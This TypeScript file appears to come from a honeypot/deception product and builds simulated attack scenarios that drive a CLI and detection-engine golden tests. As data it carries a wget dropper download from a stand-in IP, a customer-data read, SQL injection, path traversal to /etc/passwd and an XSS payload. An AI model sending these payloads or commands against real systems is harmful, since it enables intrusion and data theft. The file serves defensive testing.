import type { DecoyEvent } from '@lxs/schema';

/**
 * Synthetic attack scenarios. Pure (no clock, no randomness, no I/O): the caller supplies the
 * base time, the source IP and an id generator, so the same scenarios drive both the CLI
 * and the detection engine's golden tests.
 */

export const SCENARIO_NAMES = [
  'noise',
  'opportunistic',
  'ps-attacker',
  'honeytoken',
  'sqli',
] as const;
export type ScenarioName = (typeof SCENARIO_NAMES)[number];

export interface ScenarioOptions {
  /** Time of the first event. */
  base: Date;
  /** Attacker source IP. */
  srcIp?: string;
  /** ULID (or ULID-shaped) id generator. */
  makeId: () => string;
}

export interface ScenarioEvent {
  /** Worked-example step this event belongs to (1-based). */
  step: number;
  /** Human-readable description of the attacker action. */
  label: string;
  /** Milliseconds after the first event. */
  offsetMs: number;
  event: DecoyEvent;
}

export const DEFAULT_SRC_IP: Record<ScenarioName, string> = {
  noise: '198.51.100.23',
  opportunistic: '192.0.2.77',
  'ps-attacker': '203.0.113.66',
  honeytoken: '203.0.113.99',
  sqli: '198.51.100.150',
};

const SSH_DECOY = 'ssh-db-backup-01';
const WEB_DECOY = 'web-admin-admin';

type Partial_ = Partial<DecoyEvent> & Pick<DecoyEvent, 'sensor' | 'event_type' | 'dst_service'>;

class Builder {
  readonly out: ScenarioEvent[] = [];
  constructor(
    private readonly opts: ScenarioOptions,
    readonly ip: string,
  ) {}

  add(step: number, label: string, offsetMs: number, e: Partial_): void {
    const event: DecoyEvent = {
      id: this.opts.makeId(),
      schema_version: 1,
      timestamp: new Date(this.opts.base.getTime() + offsetMs).toISOString(),
      is_decoy: true,
      src_ip: this.ip,
      count: 1,
      simulated: true,
      ...e,
    };
    this.out.push({ step, label, offsetMs, event });
  }
}

function sshEvent(
  session: string,
  port: number,
  e: Omit<Partial_, 'sensor' | 'dst_service'> & { dst_service?: string },
): Partial_ {
  return {
    sensor: 'ssh',
    decoy_id: SSH_DECOY,
    session_id: session,
    src_port: port,
    dst_service: 'ssh:22',
    ...e,
  };
}

function webEvent(e: Omit<Partial_, 'sensor'>): Partial_ {
  return { sensor: 'web', decoy_id: WEB_DECOY, ...e };
}

/* -------------------------------------------------------------------------- */

/** Internet noise: scanner sweep + web login brute force. R01 5 + R02 5 + R03 3 + R04 10 = 23, Low, noise. */
function noise(b: Builder): void {
  const ua = 'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)';
  b.add(
    1,
    'Scanner probes /admin',
    0,
    webEvent({
      event_type: 'http.request',
      dst_service: 'http:/admin',
      method: 'GET',
      url: '/admin',
      status_code: 200,
      user_agent: ua,
    }),
  );
  b.add(
    1,
    'Scanner probes /.env',
    250,
    webEvent({
      event_type: 'http.request',
      dst_service: 'http:/.env',
      method: 'GET',
      url: '/.env',
      status_code: 200,
      user_agent: ua,
    }),
  );
  b.add(
    1,
    'Scanner probes /backup.sql',
    500,
    webEvent({
      event_type: 'http.request',
      dst_service: 'http:/backup.sql',
      method: 'GET',
      url: '/backup.sql',
      status_code: 404,
      user_agent: ua,
    }),
  );
  const pws: [string, string][] = [
    ['admin', 'a1b2c3'],
    ['admin', 'x9y8z7'],
    ['root', 'q1w2e3r4t5'],
    ['administrator', 'welcome9'],
    ['test', 'hunter22'],
  ];
  pws.forEach(([u, mask], i) => {
    b.add(
      2,
      `Failed web login ${i + 1}`,
      900 + i * 300,
      webEvent({
        event_type: 'auth.attempt',
        dst_service: 'http:/admin/login',
        method: 'POST',
        url: '/admin/login',
        outcome: 'failure',
        username: u,
        password_masked: `${mask[0]}***${mask.slice(-1)}`,
        user_agent: ua,
        status_code: 401,
      }),
    );
  });
}

/** Scripted SSH bot, common creds. 5 + 10 + 25 + 5 + 5 + 15 = 65, High, opportunistic. */
function opportunistic(b: Builder): void {
  const s = `${SSH_DECOY}:b07d`;
  const p = 40122;
  b.add(1, 'Connects to SSH decoy', 0, sshEvent(s, p, { event_type: 'connection.open' }));
  b.add(
    1,
    'SSH client banner',
    120,
    sshEvent(s, p, { event_type: 'ssh.client', client_banner: 'SSH-2.0-Go' }),
  );
  for (let i = 0; i < 6; i++) {
    b.add(
      2,
      `Failed login ${i + 1}`,
      300 + i * 150,
      sshEvent(s, p, {
        event_type: 'auth.attempt',
        outcome: 'failure',
        username: 'root',
        password_masked: 'p***d',
      }),
    );
  }
  b.add(
    3,
    'Logs in as root/root',
    1300,
    sshEvent(s, p, {
      event_type: 'auth.attempt',
      outcome: 'success',
      username: 'root',
      password_clear: 'root',
    }),
  );
  b.add(
    4,
    'uname -a',
    1500,
    sshEvent(s, p, { event_type: 'command.exec', outcome: 'success', command: 'uname -a' }),
  );
  b.add(
    4,
    'wget dropper',
    1700,
    sshEvent(s, p, {
      event_type: 'command.exec',
      outcome: 'success',
      command: 'wget http://198.51.100.9/x.sh -O /tmp/x.sh',
    }),
  );
  b.add(
    4,
    'chmod dropper',
    1900,
    sshEvent(s, p, {
      event_type: 'command.exec',
      outcome: 'success',
      command: 'chmod +x /tmp/x.sh',
    }),
  );
}

/** The PS use case, exactly as the worked example in BREAKDOWN 7.6. Running score: 5, 10, 20, 45, 50, 60, 70, then 100 (critical). */
function psAttacker(b: Builder): void {
  const s = `${SSH_DECOY}:7f3a`;
  const p = 51544;
  const ua =
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36';

  b.add(1, 'Connects to the SSH decoy', 0, sshEvent(s, p, { event_type: 'connection.open' }));
  b.add(
    1,
    'SSH client banner',
    300,
    sshEvent(s, p, {
      event_type: 'ssh.client',
      client_banner: 'SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13',
    }),
  );

  b.add(
    2,
    'Probes /admin',
    8_000,
    webEvent({
      event_type: 'http.request',
      dst_service: 'http:/admin',
      method: 'GET',
      url: '/admin',
      status_code: 200,
      user_agent: ua,
    }),
  );
  b.add(
    2,
    'Probes /.env',
    14_200,
    webEvent({
      event_type: 'http.request',
      dst_service: 'http:/.env',
      method: 'GET',
      url: '/.env',
      status_code: 200,
      user_agent: ua,
    }),
  );
  b.add(
    2,
    'Probes /backup.sql',
    21_700,
    webEvent({
      event_type: 'http.request',
      dst_service: 'http:/backup.sql',
      method: 'GET',
      url: '/backup.sql',
      status_code: 200,
      user_agent: ua,
    }),
  );

  const fails: [string, string, number][] = [
    ['root', 'r***t', 30_000],
    ['admin', 'a***1', 34_100],
    ['postgres', 'p***s', 39_300],
    ['backup', 'b***p', 43_200],
    ['dbadmin', 'd***n', 48_600],
  ];
  fails.forEach(([u, m, t], i) => {
    b.add(
      3,
      `Failed SSH login ${i + 1}`,
      t,
      sshEvent(s, p, {
        event_type: 'auth.attempt',
        outcome: 'failure',
        username: u,
        password_masked: m,
      }),
    );
  });

  b.add(
    4,
    'Logs in with admin/admin',
    58_000,
    sshEvent(s, p, {
      event_type: 'auth.attempt',
      outcome: 'success',
      username: 'admin',
      password_clear: 'admin',
    }),
  );

  b.add(
    5,
    'cd /srv',
    64_000,
    sshEvent(s, p, {
      event_type: 'command.exec',
      outcome: 'success',
      username: 'admin',
      command: 'cd /srv',
    }),
  );
  b.add(
    5,
    'export TERM=xterm',
    67_500,
    sshEvent(s, p, {
      event_type: 'command.exec',
      outcome: 'success',
      username: 'admin',
      command: 'export TERM=xterm',
    }),
  );
  b.add(
    5,
    'clear',
    73_000,
    sshEvent(s, p, {
      event_type: 'command.exec',
      outcome: 'success',
      username: 'admin',
      command: 'clear',
    }),
  );

  b.add(
    6,
    'ls -la',
    81_000,
    sshEvent(s, p, {
      event_type: 'command.exec',
      outcome: 'success',
      username: 'admin',
      command: 'ls -la',
    }),
  );
  b.add(
    6,
    'uname -a',
    90_500,
    sshEvent(s, p, {
      event_type: 'command.exec',
      outcome: 'success',
      username: 'admin',
      command: 'uname -a',
    }),
  );

  b.add(
    7,
    'cat customer_data.csv',
    104_000,
    sshEvent(s, p, {
      event_type: 'command.exec',
      outcome: 'success',
      username: 'admin',
      command: 'cat /srv/exports/customer_data.csv',
    }),
  );

  b.add(8, 'Calls the real /api/payments', 140_000, {
    sensor: 'sdk',
    is_decoy: false,
    dst_service: 'app:/api/payments',
    event_type: 'asset.access',
    method: 'GET',
    url: '/api/payments',
    status_code: 200,
    asset_name: 'Payments API',
    user_agent: ua,
  });

  b.add(9, 'Uses the honeytoken key from acme.json', 175_000, {
    sensor: 'sdk',
    is_decoy: false,
    dst_service: 'app:/api/payments',
    event_type: 'honeytoken.use',
    method: 'GET',
    url: '/api/payments',
    honeytoken_id: 'ht-acme-api-key',
    user_agent: ua,
  });
}

/** Reads a planted honeytoken file then uses the key on the real app. R01 5 + R11 10 + R16 50, floor Critical, targeted. */
function honeytoken(b: Builder): void {
  const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/128.0';
  b.add(
    1,
    'Fetches /.env',
    0,
    webEvent({
      event_type: 'http.request',
      dst_service: 'http:/.env',
      method: 'GET',
      url: '/.env',
      status_code: 200,
      user_agent: ua,
    }),
  );
  b.add(
    2,
    'Reads the planted honeytoken file',
    6_500,
    webEvent({
      event_type: 'honeytoken.read',
      dst_service: 'http:/.env',
      method: 'GET',
      url: '/.env',
      status_code: 200,
      honeytoken_id: 'ht-acme-api-key',
      user_agent: ua,
    }),
  );
  b.add(3, 'Uses the honeytoken key on the real API', 92_000, {
    sensor: 'sdk',
    is_decoy: false,
    dst_service: 'app:/api/orders',
    event_type: 'honeytoken.use',
    method: 'GET',
    url: '/api/orders',
    honeytoken_id: 'ht-acme-api-key',
    user_agent: 'python-requests/2.32.3',
  });
}

/** sqlmap-style injection run against the decoy panel. R01 5 + R02 5 + R03 3 + R05 capped at 20 = 33, Medium, noise (label rule: only R01-R05 fired). */
function sqli(b: Builder): void {
  const ua = 'sqlmap/1.8.4#stable (https://sqlmap.org)';
  const base = (path: string) => ({
    event_type: 'http.request' as const,
    dst_service: `http:${path.split('?')[0]}`,
    method: 'GET',
    user_agent: ua,
  });
  b.add(1, 'Probe', 0, webEvent({ ...base('/admin'), url: '/admin', status_code: 200 }));
  b.add(
    2,
    'UNION SELECT',
    200,
    webEvent({
      ...base('/admin/search'),
      url: "/admin/search?q=1' UNION SELECT username,password FROM users--",
      status_code: 500,
    }),
  );
  b.add(
    2,
    'Boolean-based',
    400,
    webEvent({ ...base('/admin/search'), url: "/admin/search?q=1' OR '1'='1", status_code: 200 }),
  );
  b.add(
    3,
    'Path traversal',
    600,
    webEvent({
      ...base('/admin/file'),
      url: '/admin/file?name=../../../../etc/passwd',
      status_code: 400,
    }),
  );
  b.add(
    3,
    'XSS',
    800,
    webEvent({
      ...base('/admin/search'),
      url: '/admin/search?q=%3Cscript%3Ealert(1)%3C/script%3E',
      status_code: 200,
    }),
  );
  b.add(
    4,
    'Login SQLi',
    1000,
    webEvent({
      event_type: 'auth.attempt',
      dst_service: 'http:/admin/login',
      method: 'POST',
      url: '/admin/login',
      outcome: 'failure',
      username: "admin' --",
      password_masked: 'x***x',
      user_agent: ua,
      status_code: 401,
    }),
  );
}

const BUILDERS: Record<ScenarioName, (b: Builder) => void> = {
  noise,
  opportunistic,
  'ps-attacker': psAttacker,
  honeytoken,
  sqli,
};

export function buildScenario(name: ScenarioName, opts: ScenarioOptions): ScenarioEvent[] {
  const build = BUILDERS[name];
  if (!build)
    throw new Error(`Unknown scenario "${name}". Choose one of: ${SCENARIO_NAMES.join(', ')}`);
  const b = new Builder(opts, opts.srcIp ?? DEFAULT_SRC_IP[name]);
  build(b);
  return b.out.sort((a, c) => a.offsetMs - c.offsetMs);
}

export function isScenarioName(s: string): s is ScenarioName {
  return (SCENARIO_NAMES as readonly string[]).includes(s);
}
